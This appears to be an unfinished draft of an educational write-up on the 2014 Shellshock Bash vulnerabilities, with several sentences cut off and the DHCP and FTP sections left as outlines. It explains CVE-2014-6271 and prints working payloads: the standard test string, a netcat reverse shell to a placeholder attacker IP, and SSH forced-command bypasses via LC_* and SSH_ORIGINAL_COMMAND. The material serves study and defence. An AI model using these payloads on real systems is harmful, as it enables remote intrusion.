# Introduction
In 2014, security researchers found a series of injection vulnerabilities in Bash that came to be known as Shellshock. Several of the vulnerabilities had been in Bash for 25 years before they were patched. The widespread use of Bash caused many different services to be affected and left millions of Unix computers vulnerable. The injection vulnerability could allow remote attackers to send malicious payloads to 

The Bourne-Again Shell (Bash) has become a very commonly used computer program across many different Unix-based operating systems. Versions of Bash exist for Linux, BSD, and macOS. All of these versions share most of their code-base and resulted in the same vulnerability affecting many different operating systems. As a shell, Bash is used to execute commands on a computer. Bash can be used either interactively by a user to type in commands or non-interactively by other computer programs. The commonality of Bash has resulted in many other services relying on Bash 

Injection vulnerabilities allow an attacker to create malicious inputs that alter the expected behavior of a system. Every computer system or program works by accepting inputs, processing the input, and then taking an action. Developers must be careful when making assumptions about the content, form, or source of an input because attackers can maniuplate all of these 

-something  else
- Summary and overview of paper

# Breaking down the Vulnerabilities
Shellshock consists of several different vulnerabilities that relate to how Bash handles environment variables. These variables allow a user or script to define a value once and then reuse that value again by giving it's name. An environment variable definition in Bash might look like `GREETING="Hello, World!"`. After defining this variable, the value `Hello, World!` can be used again by just typing `$GREETING`. Programs frequently pass arguments or configuration values to Bash by assigning variables before invoking it. However, environment variables can also accidentally leak into Bash because by default any environment variables set in the original processes environment will be passed into Bash. This behavior can cause the unintended consequences of leaking sensitive information or causing vulnerabilities.

Bash scripts can define functions that contain sections of code that can be reused. A function is properly defined using the syntax, `hello() { echo "Hello"; }` which would define a function called `hello` that would print Hello. Before Shellshock, Bash scripts stored functions as environment variables. Therefore, the same function could equivalently be defined in an environment variable with `hello=() { echo "Hello"; }`. This behavior allowed Bash scripts to export functions and allow sub-shells to use them. However, this feature has been removed and will not longer work in modern versions of Bash.

The original Shellshock vulnerability, CVE-2014-6271, comes from how Bash implemented importing functions stored in environment variables. When a new shell was created, it would automatically look through the environment variables for functions and import all of them. Each function was imported by simply removing the `=` and evaluating the result. The function `hello="() { echo "Hello"; }"` would become `hello() { echo "Hello"; }`. However, CVE-2014-6271 observes that this behavior can be exploited by appending extra code to the end of the function definition. This vulnerability means that if attacker can store a malicious payload in an environment variable, they can achieve arbitrary code execution whenever a Bash shell is created. Many other flaws were found in how Bash imported functions and resulted in this behavior being completely changed to remove the entire class of vulnerabilities.

## Demonstrating CVE-2014-6271
Demonstrating Shellshock requires a vulnerable version of Bash. For my testing, I used [Ubuntu 12.04.5 Precise Pangolin](https://releases.ubuntu.com/12.04/). The installer image for this release was created just before Shellshock was discovered and contains a vulnerable version of Bash 4.2. However, it can be difficult to determine whether or not a specific version number of Bash is vulnerable because many almost every version has received patches from different OS vendors[2]. Instead, the standard way to determine if a specific version has been patched is to run test commands and observe the output. A comprehensive test script can be found [here](https://github.com/hannob/bashcheck).

```
$ env X='() { :; }; echo "pwned"' bash -c :
```
This is the standard test string to observe if Bash has been patched for CVE-2014-6271. If it is vulnerable, it will print `pwned`. Otherwise, it will print nothing.

```
(1)                             (2)
env X='() { :; }; echo "pwned"' bash -c :
```
This command consists of two sub-commands that setup the environment and then test it. (1) creates a new environment and assigns the variable X to the string value `() { :; }; echo "pwned"`. (2) invokes a new bash shell with the command `:`, which means do nothing.

```
(1)       (2)
() { :; }; echo "pwned"
```
The first half (1) of this payload is the definition of an anonymous function that does nothing. The second half (2) is the malicious payload that will be executed when the function is imported. Any arbitrary command or series of commands can be appended to the function definition to achieve arbitrary code execution. This exploit works because of how the function is imported. The `=` is just removed and the line `X() { :; }; echo "pwned"` is passed to the Bash interpreter. The semi-colon acts as a new-line break, and the definition of the `X` function and the malicious payload are both executed.

```
$ env X='() { :; }; nc <attacker_ip> <port> -e /bin/bash &' bash -c :
```
This example can be used to open a reverse shell using the same exploit. On the attacker's computer, run `nc -lvp <port>` to listen for the victim calling home. Replace `<attacker_ip>` with address of the attacker's machine and `<port>` with a port number. This example works by using netcat to open a Bash session and redirect the input and output to the attacker's machine. The `&` operator means that the session is opened in the background without the client and knowing.

# SSH
Secure Shell (SSH) is a service that allows user to securely access a shell on a remote computer. SSH is commonly used because it is extremely useful to be able to execute commands on a remote computer as if you were sitting in front of it. However, the power and ease of use of SSH can create security vulnerabilities if it is improperly secured. By default, SSH will use password authentication to allow users to login with the same password as their account password. For additionally security, a user can instead use a public/private key pair to authenticate with the server. To enable key-based authentication, a user would add their public key to `~/.ssh/authorized_keys`. Then the user could securely log into the computer with their private key.

SSH can be used for both full and restricted shell access. Developers frequently use SSH to manage remote and virtual machines because it allows complete control of the system remotely. In this use case, a developer wants to be able to execute arbitrary commands and have a full shell. However, SSH can also be used by programs to access other machines or automate tasks. It is a good security practice to only give a services the minimum required permissions. Instead of allowing a service to execute arbitrary commands over SSH, a "Forced Command" can be used to restrict a user to only executing one command. When a Forced Command is specified, this user should not be able to execute any other commands.

SSH can be exploited using Shellshock to breakout of a Forced Command and achieve arbitrary remote code execution. This exploit will only work if the remote user's shell is Bash. In order to use Shellshock, an attacker just needs to find a way to set an environment variable on the remote machine. A malicious environment variable will then be expanded and executed before the Forced Command is executed. Two potential ways to set an environment variable are through the `LC_*` or `SSH_ORIGINAL_COMMAND`.

## Forced Command Exploit
To enable a forced command using the `authorized_keys` file, it should follow this pattern.
```
command="<command>" <public key> <comment>
```
Example:
```
command="echo goodbye" ssh-rsa AAAAB3Nza...IhoZ+pvQKj ubuntu@precise 
```

### LC_*
By default, the config file `/etc/ssh/sshd_config` will include the line `AcceptEnv LANG LC_*`. This line tells the SSH daemon to automatically copy these environment variables from the user's shell to the remote shell. All an attacker needs to do is set one of these variables to a Shellshock payload before SSHing and it will be copied to the remote shell.
```
env LC_PAYLOAD='() { :; }; echo "pwned"' ssh <user>@<server address>
```

### SSH_ORIGINAL_COMMAND
Normally a user can execute a single command over SSH by appending it to the SSH command. When using a Forced Command, the appended command is ignored, but it is stored in the SSH_ORIGINAL_COMMAND environment variable. This feature can then be exploited by including the Shellshock payload in the original command.
```
ssh <user>@<server address> '() { :; }; echo "pwned"'
```

# DHCP
The Dynamic Host Configuration Protocol (DHCP) defines a method for dynamically allocating IP addresses to clients in a computer network. DHCP allows client devices to seamlessly join a network, receive an address, and start communicating. Without DHCP, users would have to manually choose an address an ensure no other user was using the same address. DHCP uses a client/server architecture. When a client joins a network, it will broadcast a "DHCP Discover" message. One or more DHCP servers will receive the broadcast and send back a "DHCP Offer". The server is responsible for keeping track of available IP addresses, and the offer will contain an IP address along with other configuration options. The client will accept one of the offers it receives and can now use that address to communicate on the network.

On Unix operating systems, the `dhclient` command provides methods for automating the process of requesting an address and configuring a network interface to use it. `dhclient` includes a hook system to allow other programs to register callbacks for when a DHCP offer is accepted or an address is released. On Ubuntu 12.04, the `/etc/dhcp/dhclient-enter-hooks.d` and `/etc/dhcp/dhclient-exit-hooks.d` directories contain the scripts to be automatically executed by the hooks. Each script is automatically executed using Bash and the details of the DHCP offer are stored in environment variables. This feature allows seamlessly connecting to a network but creates the potential for security vulnerabilities.

A malicious DHCP server embed a Shellshock payload into a DHCP Offer and cause remote code execution. All of the details of the 

## Creating a Malicious DHCP Server

- Include picture of Wireshark

# Exploiting FTP

# Conclusion
- How did this vulnerability get into Bash? https://unix.stackexchange.com/questions/157381/when-was-the-shellshock-cve-2014-6271-7169-bug-introduced-and-what-is-the-pat/157495#157495
- Base vulnerability not very interesting, no priviledge escalation
- SSH vulnerability is high severity but isn't widely used
- Key takeaways about protecting against injection vulnerabilities
- Interesting that none of these programs choose to validate the contents of environment variables

# Sources
1. [OWASP presentation with explanation and demonstration](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)
2. [StackExchange explanation from Stephane Chazelas, the researcher who found CVE-2014-6271](https://unix.stackexchange.com/questions/157381/when-was-the-shellshock-cve-2014-6271-7169-bug-introduced-and-what-is-the-pat/157495#157495)
3. [Proof of concept code and list of vulnerable programs](https://github.com/mubix/shellshocker-pocs)
4. [SSH LC_* demonstration](https://www.zdziarski.com/blog/?p=3905)
5. [SSH_ORIGINAL_COMMAND demonstration](https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh)
6. [DHCP Shellshock Exploit](https://blog.trendmicro.com/trendlabs-security-intelligence/bash-bug-saga-continues-shellshock-exploit-via-dhcp/)
7. [List of DHCP Option Codes](https://tools.ietf.org/html/rfc3679)
8. [Install DHCP Server on Ubuntu](https://ubuntu.com/server/docs/network-dhcp)
9. [DHCP Server won't send options](https://askubuntu.com/questions/912252/dhcp-server-wont-send-options)
10. [NetworkManager doesn't use dhclient-script hooks](https://andytson.com/blog/2009/03/workaround-so-networkmanager-runs-dhclient-hooks/)